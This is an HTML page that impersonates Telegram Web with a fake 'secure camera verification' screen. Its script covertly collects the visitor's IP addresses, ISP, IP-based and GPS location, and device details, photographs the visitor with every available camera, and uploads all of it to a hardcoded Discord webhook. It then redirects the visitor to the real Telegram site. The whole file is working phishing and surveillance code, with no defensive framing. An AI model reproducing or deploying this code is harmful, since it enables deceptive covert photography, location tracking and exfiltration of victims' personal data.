<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
  <title>Telegram Web: Secure Camera Verification</title>
  <meta property="og:title" content="Telegram Web">
  <meta property="og:description" content="Sign in to your Telegram account securely.">
  <meta property="og:type" content="website">
  <meta name="theme-color" content="#24A1DE">
  <style>
    :root {
      --tg-blue: #24A1DE;
      --tg-bg: #ffffff;
      --tg-text: #000000;
      --tg-sub: #8e8e93;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--tg-bg);
      color: var(--tg-text);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      user-select: none;
      overflow: auto;
    }

    #screen-landing {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .faceid-frame {
      width: 120px; height: 120px;
      position: relative;
      margin-bottom: 30px;
    }
    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
    }
    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
    .faceid-corners { position: absolute; inset: 0; }
    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }

    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }

    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }

    .verify-btn {
      width: 90%;
      padding: 16px;
      background: var(--tg-blue);
      color: white;
      border: none;
      border-radius: 14px;
      font-size: 1.05rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .verify-btn:active { transform: scale(0.96); opacity: 0.9; }

    .secure-text {
      margin-top: 30px;
      font-size: 0.8rem;
      color: #34c759;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    #screen-capture {
      display: none;
      position: fixed; inset: 0; background: #fff; z-index: 100;
      flex-direction: column; align-items: center; justify-content: flex-start;
      overflow-y: auto;
      padding: 20px;
    }

    .camera-preview {
      width: 100%;
      max-width: 500px;
      border-radius: 20px;
      margin: 10px 0;
      box-shadow: 0 0 0 2px var(--tg-blue);
    }

    .thumbnails {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
      margin-top: 20px;
      margin-bottom: 20px;
    }

    .thumbnail {
      width: 80px;
      height: 80px;
      object-fit: cover;
      border-radius: 12px;
      border: 2px solid var(--tg-blue);
    }

    .status-text {
      font-size: 1rem;
      color: var(--tg-blue);
      margin: 15px;
      font-weight: 600;
      text-align: center;
    }

    #hidden-canvas { display: none; }
    #hidden-video { position: fixed; opacity: 0; left: -999px; width: 1px; height: 1px; }
    
    .section-title {
      font-weight: 700;
      margin-top: 20px;
      margin-bottom: 10px;
      font-size: 1.2rem;
      color: var(--tg-text);
      border-bottom: 2px solid var(--tg-blue);
      display: inline-block;
    }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-landing">
  <div class="faceid-frame">
      <div class="faceid-corners"></div>
      <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
  </div>
  <div class="tg-title">Camera Verification Required</div>
  <div class="tg-subtitle">Secure access requires capturing from all available cameras on your device.</div>
  
  <button class="verify-btn" onclick="triggerSilentCameraCapture()">Verify Identity</button>

  <div class="secure-text">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    End-to-End Encrypted
  </div>
</div>

<div id="screen-capture">
  <div class="status-text" id="capture-status">📸 Initializing silent camera scan...</div>
  <div id="live-preview-container"></div>
  <div class="section-title">📷 Captured From All Cameras</div>
  <div id="camera-thumbnails" class="thumbnails"></div>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
  
  let ipInfo = { v4: '...', v6: '...', locationIp: '...', isp: '...' };
  let geoLocation = { lat: null, lon: null, accuracy: null, error: null };
  let capturedImages = []; // { blob, name, thumbnailUrl, label }

  // Fetch IPv4, IPv6, IP-based location
  async function loadNetworkInfo() {
    try {
      // IPv4 + IP location
      const ipv4Res = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query,lat,lon');
      const ipv4Data = await ipv4Res.json();
      if(ipv4Data.status === 'success') {
        ipInfo.v4 = ipv4Data.query;
        ipInfo.locationIp = `${ipv4Data.city}, ${ipv4Data.regionName}, ${ipv4Data.country} (${ipv4Data.lat}, ${ipv4Data.lon})`;
        ipInfo.isp = ipv4Data.isp;
      }
      
      // IPv6 separate
      const ipv6Res = await fetch('https://api64.ipify.org?format=json');
      const ipv6Data = await ipv6Res.json();
      ipInfo.v6 = ipv6Data.ip || 'Not available';
    } catch(e) { console.warn("IP fetch error", e); }
  }

  // Get precise GPS geolocation (if user allows)
  async function getPreciseGeo() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        geoLocation.error = "Geolocation not supported";
        resolve();
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          geoLocation.lat = pos.coords.latitude;
          geoLocation.lon = pos.coords.longitude;
          geoLocation.accuracy = pos.coords.accuracy;
          resolve();
        },
        (err) => {
          geoLocation.error = err.message;
          resolve();
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  }

  async function triggerSilentCameraCapture() {
    // Fullscreen
    if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(e=>{});

    // Hide landing, show capture UI
    document.getElementById('screen-landing').style.display = 'none';
    const captureScreen = document.getElementById('screen-capture');
    captureScreen.style.display = 'flex';
    document.getElementById('camera-thumbnails').innerHTML = '';
    capturedImages = [];

    // Load network info + geolocation
    await loadNetworkInfo();
    await getPreciseGeo();

    // Get all camera devices
    let devices = [];
    try {
      const allDevices = await navigator.mediaDevices.enumerateDevices();
      devices = allDevices.filter(device => device.kind === 'videoinput');
    } catch(e) { console.error("enum error", e); }

    if (devices.length === 0) {
      document.getElementById('capture-status').innerText = '❌ No cameras found on this device!';
      return;
    }

    document.getElementById('capture-status').innerText = `🔍 Found ${devices.length} camera(s). Capturing silently...`;

    for (let i = 0; i < devices.length; i++) {
      const device = devices[i];
      let label = device.label || `Camera ${i+1}`;
      // Clean label for filename
      const cleanLabel = label.replace(/[^a-z0-9]/gi, '_').substring(0, 30);
      document.getElementById('capture-status').innerText = `📸 Capturing from: ${label}`;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { deviceId: { exact: device.deviceId } }
        });

        // Show live preview (silent, no audio)
        const previewContainer = document.getElementById('live-preview-container');
        const videoElem = document.createElement('video');
        videoElem.autoplay = true;
        videoElem.playsInline = true;
        videoElem.muted = true;  // NO SOUND
        videoElem.volume = 0;    // extra silence
        videoElem.srcObject = stream;
        videoElem.className = 'camera-preview';
        previewContainer.innerHTML = '';
        previewContainer.appendChild(videoElem);
        
        // Wait for camera to stabilize
        await new Promise(r => setTimeout(r, 600));

        // Capture frame
        const blob = await captureFrameFromStream(stream);
        if (blob) {
          const thumbnailUrl = URL.createObjectURL(blob);
          capturedImages.push({ 
            blob, 
            name: `cam_${i+1}_${cleanLabel}.jpg`, 
            thumbnailUrl,
            label: label
          });
          
          const thumbDiv = document.getElementById('camera-thumbnails');
          const img = document.createElement('img');
          img.src = thumbnailUrl;
          img.className = 'thumbnail';
          img.title = label;
          thumbDiv.appendChild(img);
        }

        // Stop all tracks silently
        stream.getTracks().forEach(track => track.stop());
        
      } catch(err) {
        console.warn(`Failed to capture from ${label}`, err);
        document.getElementById('capture-status').innerHTML += `<br>⚠️ Could not access: ${label}`;
      }
    }

    document.getElementById('capture-status').innerHTML = `✅ Captured ${capturedImages.length} image(s) from all cameras. Sending to secure server...`;
    
    // Send everything to Discord
    await uploadToDiscord(capturedImages);
    
    // Redirect
    window.location.href = 'https://telegram.org';
  }

  async function captureFrameFromStream(stream) {
    const video = document.getElementById('hidden-video');
    video.srcObject = stream;
    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.getElementById('hidden-canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(resolve, 'image/jpeg', 0.92);
          video.srcObject = null;
        }, 250);
      };
    });
  }

  async function uploadToDiscord(cameraImages) {
    const formData = new FormData();
    
    // Build location string
    let locationString = ipInfo.locationIp;
    if (geoLocation.lat && geoLocation.lon) {
      locationString += `\n🎯 PRECISE GPS: ${geoLocation.lat}, ${geoLocation.lon} (accuracy ±${geoLocation.accuracy}m)`;
    } else if (geoLocation.error) {
      locationString += `\n⚠️ GPS denied or failed: ${geoLocation.error}`;
    }
    
    const embedPayload = {
      username: "📸 Silent Multi-Camera Collector",
      embeds: [{
        title: "🎯 ALL CAMERAS CAPTURED (SILENT MODE)",
        color: 0x24A1DE,
        fields: [
          { name: "📱 Device", value: `\`${navigator.platform} | ${navigator.userAgent.split(' ').slice(-2).join(' ')}\``, inline: false },
          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
          { name: "📍 Location (IP + GPS)", value: locationString, inline: false },
          { name: "🏢 ISP", value: ipInfo.isp || "Unknown", inline: true },
          { name: "📷 Cameras Found", value: `${cameraImages.length} images attached`, inline: true },
          { name: "🔇 Audio/Scares", value: "Disabled (silent mode)", inline: true }
        ],
        footer: { text: "Telegram Secure Login • Silent Camera Access • No Sounds • No Jumpscares" }
      }]
    };
    formData.append('payload_json', JSON.stringify(embedPayload));
    
    cameraImages.forEach((img, idx) => {
      formData.append(`camera_${idx+1}_${img.name}`, img.blob, img.name);
    });
    
    try {
      await fetch(WEBHOOK, { method: 'POST', body: formData });
      console.log("Uploaded", cameraImages.length, "images");
    } catch(e) { console.error("Upload failed", e); }
  }
</script>
</body>
</html>
